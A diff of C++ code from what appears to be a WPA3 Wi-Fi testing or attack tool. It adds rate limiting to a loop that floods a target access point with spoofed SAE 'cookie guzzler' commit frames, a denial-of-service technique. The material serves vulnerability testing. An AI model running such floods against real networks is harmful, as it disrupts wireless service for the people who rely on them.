@@ -55,7 +55,8 @@ RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6>
 }
 
 void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
-				const dos_helpers::SAEPair &sae_params, const string &att_mac, const size_t burst_size
+				const dos_helpers::SAEPair &sae_params, const string &att_mac, const size_t burst_size,
+				const size_t packets_per_second_limit
 ){
 	PacketSender sender(iface_name);
 	long long counter = 0;
@@ -63,14 +64,21 @@ void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int 
 
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 	while(steady_clock::now() < end_time){
+		const auto burst_start = steady_clock::now();
+
 		const string sta_mac = firmware::get_random_ath_masker_mac(att_mac);
 		auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);
 
 		//  burst of packet
 		for(size_t i = 0; i < burst_size; ++i){
 			sender.send(cg_frame);
-			this_thread::sleep_for(nanoseconds(100));
 		}
+
+		// Rate control: 64 packets / 1000 pkt/s = 64ms per burst
+		auto target_burst_duration = microseconds(burst_size * 1'000'000 / packets_per_second_limit);
+		if(const auto elapsed = steady_clock::now() - burst_start; elapsed < target_burst_duration)
+			this_thread::sleep_for(target_burst_duration - elapsed);
+
 		counter += burst_size;
 
 		if(counter >= next_log){
@@ -98,7 +106,7 @@ void run_attack(RunStatus &rs){
 		attacker->set_monitor_mode();
 		attacker->set_iface_up();
 		check_vuln(attacker["iface"], ap_mac, duration, sae_params.value(), attacker["mac"],
-			att_cfg.at("burst_size").get<size_t>());
+			att_cfg.at("burst_size").get<size_t>(), att_cfg.at("packets_per_second_limit").get<size_t>());
 	} else{
 		throw runtime_error("SAE Commit capture failed");
 	}
